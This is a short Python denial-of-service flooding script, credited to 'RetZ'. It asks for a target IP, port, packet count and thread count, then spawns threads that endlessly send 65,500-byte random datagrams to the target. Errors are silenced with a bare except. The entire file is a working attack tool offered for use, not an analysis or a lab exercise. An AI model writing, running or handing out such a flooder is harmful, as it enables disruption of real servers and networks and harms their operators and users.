import random
import socket
import threading
import os

os.system("clear")
print('''\033[1;31;40m
Code By RetZ.
''')

ip = str(input("\033[93mIp Target: "))
port = int(input("\033[93mPort Target: "))
times = int(input("\033[93mPackets: "))
threads = int(input("\033[93mThreads: "))
def udp():
  data = random._urandom(65500)
  pack = 0
  while True:
    try:
     # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     # s.setsockopt(socket.SOL_SOCKET, socket.REUSE_ADDR)

      sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
     # sock.setsockopt(socket.SOL_SOCKET, socket.REUSE_ADDR)

      addr = (str(ip),int(port))
      for x in range(times):
       # s.sendto(data,addr)
        sock.sendto(data,addr)
      pack += 1
      print(f"\033[91mSend Packets To %s:%s ==> %s"%(ip,port,pack))
    except:
      pass

for y in range(threads):
  th = threading.Thread(target = udp)
  th.start()
